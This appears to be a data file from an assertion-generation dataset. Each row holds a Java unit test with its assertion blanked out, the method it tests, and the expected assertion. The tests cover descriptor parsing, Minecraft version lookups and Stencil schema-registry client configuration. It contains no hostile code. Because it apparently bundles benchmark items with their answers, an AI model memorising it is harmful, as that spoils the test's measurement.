"descriptorTests() { String descs = """"; ArrayList<String> descsArr = new ArrayList<String>();  ConfigurationBuilder conf = ConfigurationBuilder.build(ClassLoader.getSystemClassLoader()); for (Package p : getClass().getClassLoader().getDefinedPackages()) { String rname = p.getName().replace(""."", ""/""); try { Enumeration<URL> roots = getClass().getClassLoader().getResources(rname); for (URL i : Collections.list(roots)) { conf.addUrls(i); } } catch (IOException ex) { } } Reflections reflections = new Reflections(conf); String[] types = reflections.getSubTypesOf(Map.class).stream().map(t -> t.getTypeName()) .toArray(t -> new String[t]);  int l = rnd.nextInt(160); for (int i = 0; i < l; i++) { int arrays = 0; for (int i2 = 0; i2 < rnd.nextInt(30); i2++) { arrays += (rnd.nextInt(4) == 1 ? 1 : 0); } String suffix = """"; String prefix = """"; for (int s = 0; s < arrays; s++) { suffix += ""[]""; prefix += ""[""; } int r = rnd.nextInt(Fluid.descriptors.keySet().size() + (l / 7)); if (r >= Fluid.descriptors.keySet().size()) { String type = types[rnd.nextInt(types.length)] + suffix; descsArr.add(type); descs += Fluid.getDescriptor(type); } else { char c = Fluid.descriptors.keySet().toArray(t -> new Character[t])[r]; descs += prefix + c; descsArr.add(Fluid.descriptors.get(c) + suffix); } } String[] args = Fluid.parseMultipleDescriptors(descs); for (int i = 0; i < descsArr.size(); i++) { ""<AssertPlaceHolder>""; } }
parseMultipleDescriptors(String descriptor) { ArrayList<String> argumentTypes = new ArrayList<String>(); int l = descriptor.length(); for (int i = 0; i < l; i++) { Object[] info = parseDescriptorIntern(descriptor, i, l); i = (int) info[1]; argumentTypes.add(info[0].toString()); } return argumentTypes.toArray(t -> new String[t]); }"	assertTrue(args[i].equals(descsArr.get(i)))
"IOException { if (!MinecraftToolkit.hasMinecraftDownloadConnection()) return; // Download all version information objects MinecraftToolkit.resetServerConnectionState(); MinecraftToolkit.resolveVersions();  // Parse it manually MinecraftVersionInfo info = MinecraftVersionToolkit.getLatestReleaseVersion(); URL u = new URL(MinecraftToolkit.version_manifest_url); InputStreamReader reader = new InputStreamReader(u.openStream()); JsonObject json = JsonParser.parseReader(reader).getAsJsonObject(); reader.close(); Gson gson = new Gson(); @SuppressWarnings(""unchecked"") Map<String, String> latest = gson.fromJson(json.get(""latest""), Map.class); String v = latest.get(""release"");  // Test if the version information matches ""<AssertPlaceHolder>""; }
getLatestReleaseVersion() { return MinecraftToolkit.available_versions.getOrDefault(""Latest_release"", null); }"	assertTrue(info.getVersion().equals(v))
"IOException { if (!MinecraftToolkit.hasMinecraftDownloadConnection()) return; // Download all version information objects MinecraftToolkit.resetServerConnectionState(); MinecraftToolkit.resolveVersions();  // Parse it manually MinecraftVersionInfo info = MinecraftVersionToolkit.getLatestSnapshotVersion(); URL u = new URL(MinecraftToolkit.version_manifest_url); InputStreamReader reader = new InputStreamReader(u.openStream()); JsonObject json = JsonParser.parseReader(reader).getAsJsonObject(); reader.close(); Gson gson = new Gson(); @SuppressWarnings(""unchecked"") Map<String, String> latest = gson.fromJson(json.get(""latest""), Map.class); String v = latest.get(""snapshot"");  // Test if the version information matches ""<AssertPlaceHolder>""; }
getLatestSnapshotVersion() { MinecraftVersionInfo info = MinecraftToolkit.available_versions.get(""Latest_snapshot""); if (info == null) return getLatestReleaseVersion(); else return info; }"	assertTrue(info.getVersion().equals(v))
"shouldReturnOriginalFieldIndex() { FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestBookingLogMessage.getDescriptor()); ""<AssertPlaceHolder>""; }
getOriginalFieldIndex(Descriptors.FieldDescriptor fieldDescriptor) { if (!fieldDescriptorIndexMap.containsKey(fieldDescriptor.getFullName())) { throw new IllegalArgumentException(""The Field Descriptor "" + fieldDescriptor.getFullName() + "" was not found in the cache""); } return fieldDescriptorIndexMap.get(fieldDescriptor.getFullName()); }"	"assertEquals(1, fieldDescriptorCache.getOriginalFieldIndex(TestBookingLogMessage.getDescriptor().findFieldByName(""order_number"")))"
"shouldReturnOriginalFieldCount() { FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestBookingLogMessage.getDescriptor()); ""<AssertPlaceHolder>""; }
getOriginalFieldCount(Descriptors.Descriptor descriptor) { if (!protoDescriptorArityMap.containsKey(descriptor.getFullName())) { throw new IllegalArgumentException(""The Proto Descriptor "" + descriptor.getFullName() + "" was not found in the cache""); } return protoDescriptorArityMap.get(descriptor.getFullName()); }"	assertEquals(49, fieldDescriptorCache.getOriginalFieldCount(TestBookingLogMessage.getDescriptor()))
"IllegalAccessException { when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_ENABLE_KEY, SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_URLS_KEY, SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT); when(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT); when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT); when(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(configuration); stencilClient = stencilClientOrchestrator.getStencilClient();  ""<AssertPlaceHolder>""; Field stencilClientField = StencilClientOrchestrator.class.getDeclaredField(""stencilClient""); stencilClientField.setAccessible(true); stencilClientField.set(null, null); }
getStencilClient() {  if (stencilClient != null) { return stencilClient; }  stencilClient = initStencilClient(new ArrayList<>(stencilUrls)); return stencilClient; }"	assertEquals(ClassLoadStencilClient.class, stencilClient.getClass())
"IllegalAccessException { when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_ENABLE_KEY, SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT)).thenReturn(true); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_URLS_KEY, SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT)).thenReturn(""http://localhost/latest,"" + ""http://localhost/events/latest,"" + ""http://localhost/entities/release""); when(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT); when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT); when(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(configuration); stencilClient = stencilClientOrchestrator.getStencilClient();  ""<AssertPlaceHolder>""; Field stencilClientField = StencilClientOrchestrator.class.getDeclaredField(""stencilClient""); stencilClientField.setAccessible(true); stencilClientField.set(null, null); }
getStencilClient() {  if (stencilClient != null) { return stencilClient; }  stencilClient = initStencilClient(new ArrayList<>(stencilUrls)); return stencilClient; }"	assertEquals(MultiURLStencilClient.class, stencilClient.getClass())
"IllegalAccessException { when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_ENABLE_KEY, SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_ENABLE_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_URLS_KEY, SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_URLS_DEFAULT); when(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT); when(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT); when(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT); when(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT)).thenReturn(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(configuration);  List<String> enrichmentStencilURLs = Collections .singletonList(""http://localhost/latest"");  StencilClient enrichedStencilClient = stencilClientOrchestrator.enrichStencilClient(enrichmentStencilURLs);  ""<AssertPlaceHolder>""; Field stencilClientField = StencilClientOrchestrator.class.getDeclaredField(""stencilClient""); stencilClientField.setAccessible(true); stencilClientField.set(null, null); }
enrichStencilClient(List<String> additionalStencilUrls) { if (additionalStencilUrls.isEmpty()) { return stencilClient; }  stencilUrls.addAll(additionalStencilUrls); stencilClient = initStencilClient(new ArrayList<>(stencilUrls)); return stencilClient; }"	assertEquals(ClassLoadStencilClient.class, enrichedStencilClient.getClass())
"shouldReturnDefaultTimeoutIfTimeoutMsConfigNotSet() { Map<String, String> configMap = new HashMap<>(); Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Integer.valueOf(10000), stencilConfig.getFetchTimeoutMs())
"shouldReturnConfiguredTimeoutIfTimeoutMsConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, ""8000""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Integer.valueOf(8000), stencilConfig.getFetchTimeoutMs())
"shouldReturnTrueIfCacheAutoRefreshIsSetToTrue() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, ""true""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertTrue(stencilConfig.getCacheAutoRefresh())
"shouldReturnFalseIfCacheAutoRefreshIsSetToFalse() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, ""false""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertFalse(stencilConfig.getCacheAutoRefresh())
"shouldReturnFalseIfCacheAutoRefreshIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertFalse(stencilConfig.getCacheAutoRefresh())
"shouldReturnConfiguredValueIfCacheTtlMsConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, ""7800""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Long.valueOf(7800), stencilConfig.getCacheTtlMs())
"shouldReturnDefaultValueIfCacheTtlMsConfigIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Long.valueOf(900000), stencilConfig.getCacheTtlMs())
"shouldReturnVersionBasedIfRefreshStrategyConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, ""VERSION_BASED_REFRESH""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(SchemaRefreshStrategy.versionBasedRefresh().getClass(), stencilConfig.getRefreshStrategy().getClass())
"shouldReturnLongPollingIfRefreshStrategyConfigIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(SchemaRefreshStrategy.longPollingStrategy().getClass(), stencilConfig.getRefreshStrategy().getClass())
